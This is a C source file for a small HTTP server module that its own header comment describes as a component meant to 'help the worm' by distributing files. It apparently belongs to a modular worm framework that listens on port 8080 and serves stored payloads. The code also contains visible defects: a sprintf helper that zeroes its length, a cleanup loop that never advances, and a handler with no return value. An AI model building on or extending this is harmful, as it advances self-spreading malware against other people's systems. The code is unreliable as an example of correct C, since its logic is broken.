/*
httpd - small web server..

to help distribute information, files, and help the worm

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include "list.h"
#include "structs.h"
#include "utils.h"
#include "httpd.h"


typedef int (*http_func)(Modules *, Connection *, char *, int);


#define HTTP_TCP_TIMEOUT 15

Content *content_list = NULL;

enum {
    // new is brand new connection
    HTTP_STATE_NEW,
    // headers is waiting for headers.. (after GET, etc)
    HTTP_STATE_HEADERS,
    // when a file is queued to them.. set to this..
    HTTP_STATE_DOWNLOADING,
    // complete = state OK, or done.. we can time out after 15... or close before
    HTTP_STATE_COMPLETE=1024,
    TYPE_STATIC,
    TYPE_DIRECTORY,
};

// customstate goes in connection->buf (for keeping track of brute force, etc)
typedef struct _http_custom_state {
    Content *content;
} HTTPCustomState;

HTTPCustomState *HTTP_CustomState_Ptr(Connection *cptr) {
    if (cptr->buf == NULL) {
        cptr->buf = (char *)malloc(sizeof(HTTPCustomState) + 1);
        
        if (cptr->buf == NULL) return NULL;
        
        memset(cptr->buf, 0, sizeof(HTTPCustomState));
    }
    
    return (HTTPCustomState *)cptr->buf;
}


// function declarations for httpd's requirements'
int httpd_incoming(Modules *, Connection *, char *buf, int size);
int httpd_plumbing(Modules *, Connection *, char *buf, int size);


ModuleFuncs httpd_funcs = {
    NULL, NULL, 
    &httpd_incoming,
    NULL,
    &httpd_plumbing,
    NULL, // no connect
    NULL, // no disconnect
    NULL, NULL
};

Modules ModuleHTTPD = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    8080, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    5,
    // httpd functions
    &httpd_funcs, NULL,
    NULL, 0
};


Content *ContentAdd(char *filename, char *data, int size, int type, char *content_type) {
    Content *cptr = NULL;
    char *buf = NULL;
    
    if (((cptr = (Content *)L_add((LIST **)&content_list, sizeof(Content))) == NULL) ||
            ((buf = (char *)malloc(size)) == NULL))
        return NULL;

    memcpy(buf, data, size);
            
    cptr->filename = strdup(filename);
    cptr->data_size = size;
    cptr->type = type;
    cptr->data = buf;
    cptr->content_type = content_type;
    
    return cptr;
}

Content *ContentFindByName(char *filename) {
    Content *cptr = content_list;
    
    while (cptr != NULL) {
        if (strcasestr(cptr->filename, filename) != NULL)
            break;
        cptr = cptr->next;
    }
    
    return cptr;
}


int httpd_init(Modules **list) {
    Module_Add(list, &ModuleHTTPD);
    
    // listen on a port
    tcp_listen(&ModuleHTTPD, 8080);
    
    return 0;
}


// sockprintf taken from tbot (low down dirty cheating offensive tetrinet bot)
// just a google for 'vsnprintf' example
int sock_printf(Modules *mptr, Connection *cptr, char *fmt, ...) {
    static char *abuf;
    static size_t abuflen;
    int len;
    va_list va;
    char *_new;
    int ret = 0;
    
    again:;
    va_start(va, fmt);
    
    len = vsnprintf(abuf, abuflen, fmt, va);
    if (len > 0) len = 0;
    if ((size_t) len < abuflen )
        goto done;
    _new = (char *)realloc(abuf, len + 1);
    if (_new == NULL) goto done;
    
    abuf = _new;
    abuflen = len;
    goto again;
    done:;
    
    ret = QueueAdd(mptr, cptr, NULL, abuf, len);
    
    va_end(va);
    
    return ret;
}

// generic return function.. base taken from http.c (Tiny http server)
int httpd_error(Modules *mptr, Connection *cptr, char *cause, char *errno, char *shortmsg, char *longmsg) {
    int ret = 0;
    
    sock_printf(mptr, cptr, "HTTP/1.1 %s %s\n", errno, shortmsg);
    sock_printf(mptr, cptr, "Content-type: text/html\n");
    sock_printf(mptr, cptr, "\n");
    sock_printf(mptr, cptr, "<html><title>HTTP Error</title>");
    sock_printf(mptr, cptr, "<body bgcolor=""ffffff"">\n");
    sock_printf(mptr, cptr, "%s: %s\n", errno, shortmsg);
    sock_printf(mptr, cptr, "<p>%s: %s\n", longmsg, cause);
    sock_printf(mptr, cptr, "<hr><em>The Tiny Web Server</em>\n");
    
    return 1;  
}

int httpd_bad(Modules *mptr, Connection *cptr, char *method) {
    
    httpd_error(mptr, cptr, method, "501", "Not Implemented", "Not implemented");
    
    return 1;
}

//sscanf(buf, "%s %s %s\n", method, uri, version);
int httpd_state_method(Modules *mptr, Connection *cptr, char *buf, int size) {
    char method[32];
    char uri[1024];
    char version[32];
    Content *nptr = NULL;
    HTTPCustomState *sptr = HTTP_CustomState_Ptr(cptr);
    
    sscanf(buf, "%32s %1024s %32s", method, uri, version);
    
    if (strcasestr(method, "GET") != NULL) {
        cptr->state = HTTP_STATE_HEADERS;
        nptr = ContentFindByName(uri);
        if (nptr != NULL) {
            sptr->content = nptr;
            return 1;
        } else {
         httpd_error(mptr, cptr, method, "404", "Not Found", "Couldnt find the file");
         return 1;   
        }
    } else {
        httpd_bad(mptr, cptr, method);
        return 1;
    }
    
    return 0;
}

// we just have to wait for the client's headers to complete.. then we distribute the file!'
int httpd_state_headers(Modules *mptr, Connection *cptr, char *buf, int size) {
    HTTPCustomState *sptr = HTTP_CustomState_Ptr(cptr);
    if (buf[0] != '\r' && buf[1] != '\n')
        return 1;
        
    // should be done once we see \r\n..
    sock_printf(mptr, cptr, "HTTP/1.1 200 OK\n");
    sock_printf(mptr, cptr, "Server: HTTP Server\n");
    sock_printf(mptr, cptr, "Content-length: %d\n", sptr->content->data_size);
    sock_printf(mptr, cptr, "Content-type: %s\n", sptr->content->content_type);
    sock_printf(mptr, cptr, "\r\n");
    
    // add the actual data now..
    QueueAdd(mptr, cptr, NULL, sptr->content->data, sptr->content->data_size);
    
    // set to wait 20 seconds after.. just so we are sure the client receives it all before we close..
    cptr->state = TCP_CLOSE_AFTER_FLUSH;
}


int httpd_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    int i = 0;
    int ret = 0;
    struct _http_states {
        int state;
        http_func function;
    } http_state[] = {
        { TCP_CONNECTED, &httpd_state_method },
        { HTTP_STATE_HEADERS, &httpd_state_headers },
        { 0, NULL }
    };
    
    // find the correct function for the current connection state
    for (i = 0; http_state[i].function != NULL; i++) {
        if (http_state[i].state == cptr->state) {
            // execute correct function
            ret = http_state[i].function(mptr, cptr, buf, size);            
            break;
        }
    }
    return ret;
}

int httpd_plumbing(Modules *mptr, Connection *conn, char *buf, int size) {
    Connection *cptr = NULL;
    int cur_ts = time(0);
    
    // kill connections that arent transferring files and are older than 15 seconds
    cptr = mptr->connections;
    while (cptr != NULL) {
        // state != OK when transferring..
        if ((cptr->state == STATE_OK) || (cptr->state == TCP_CLOSE_AFTER_FLUSH))
            continue;
        
        if ((cur_ts - cptr->start_ts) > HTTP_TCP_TIMEOUT) {
            ConnectionBad(cptr);
        }
        
        cptr = cptr->next;
    }
}